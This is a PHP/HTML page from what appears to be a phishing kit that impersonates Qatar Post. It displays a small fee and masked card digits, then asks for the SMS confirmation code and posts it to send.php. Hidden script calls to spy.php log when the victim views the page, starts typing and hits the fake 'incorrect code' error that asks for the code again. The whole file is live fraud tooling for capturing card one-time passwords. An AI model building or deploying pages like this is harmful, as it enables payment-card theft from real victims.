<?php 
session_start();
require '../main.php';
?><!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<meta name="robots" content="nofollow,noindex">
<title>Qatar Postal Services</title>
<link rel="stylesheet" href="inc/style.css">
<link rel="icon" href="inc/icon.ico">
</head>
<body>
<div class="header">
<div class="left">
<img src="inc/menu.png">
</div>
<div class="right">
<img src="inc/logo.png">
</div>
</div>
<div style="background:#ffaf00; color:black; padding:20px; text-align:right; margin-bottom:-40px;">
<h2>التفاصيل</h2>
<table dir="rtl" style="width:100%; text-align:right;">
<tr>
<th>المبلغ: </th>
<td>6.90 ريال قطري</td>
</tr>
<tr>
<th>التاريخ: </th>
<td id='timing'>04-05-2022 03:41:18pm</td>
</tr>
<tr>
<th>البطاقة:</th>
<td>xxxxxxxxxxxx<?php if(isset($_SESSION['card'])){echo $_SESSION['card'];}else{echo "xxxx";}?></td>
</tr>
</table>
</div>
<div style="text-align:center;">
<div class="form">
<form action="send.php" method="post">

<div class="formcol">
<h2>المرجو ادخال رمز التأكيد الذي تم إرساله إلى رقم هاتفكم</h2>
</div>
<div class="formcol">
<?php 
if(isset($_GET['e'])){
	echo "<p style='color:red'>رمز التأكيد غير صحيح.</p>";
	echo "<input type='hidden' name='error' value='fuF68'>";
}
?>
<input type="text" name="otp" required placeholder="رمز التأكيد">
</div>

  <div class="formcol">
<button>تأكيد <img src="inc/narrow.png"></button>
</div>

</form>
</div>
</div>


<div class="footer">
<div class="f-side">
<div class="f-col">
<p>كيف يمكننا مساعدتك</p>
<span>الأسئلة الشائعة</span>
<span>المواد المحظورة</span>
<span>المعايير البريدية</span>
<span>فيديوهات</span>
</div>
<div class="f-col">
<p>حول بريد قطر</p>
<span>الرؤية و الرسالة و الأهداف</span>
<span>تاريخ بريد قطر</span>
<span>أخبار</span>
<span>الفروع وساعات العمل</span>
<span>الوظائف</span>
</div>
</div>
<div class="f-side">
<div class="f-col">
<p>خط التواصل</p>
<span>info@qatarposts.com</span>
<span>الخط الساخن 104</span>
<span>تابعونا</span>
<img src="inc/social.png" style="width:120px;">
</div>
<div class="f-col">
<p>سياسات</p>
<span>سياسة الخصوصية</span>
<span>السياسة العامة لأمن المعلومات</span>
<span>الشروط والأحكام</span>
<span>سياسة نظام الإدارة المتكامل</span>
</div>
</div>
<div class="f-side">
<div class="f-col">
<p>حمل التطبيق</p>
<img src="inc/android.png" style="width:70px;">
<img src="inc/apple.png" style="width:70px;">
</div>
<div class="f-col">
<img src="inc/bv.jpg" style="width:160px;">
</div>

</div>
</div>

<script src="inc/jq.js"></script>
<script>
<?php
if(isset($_GET['e'])){
	echo '$.post("spy.php",{otperrorview:1});';
}else{
	echo '$.post("spy.php",{otpview:1});';
}
?>

setInterval(function(){
$.post("date.php",{time:1},function(res){
	$("#timing").html(res);
})
 }, 1000);

var c=0;
$("input[name=otp]").keyup(function(){
c++;
if(c==1){
$.post("spy.php",{otping:1});
}
});
</script></body>
</html>
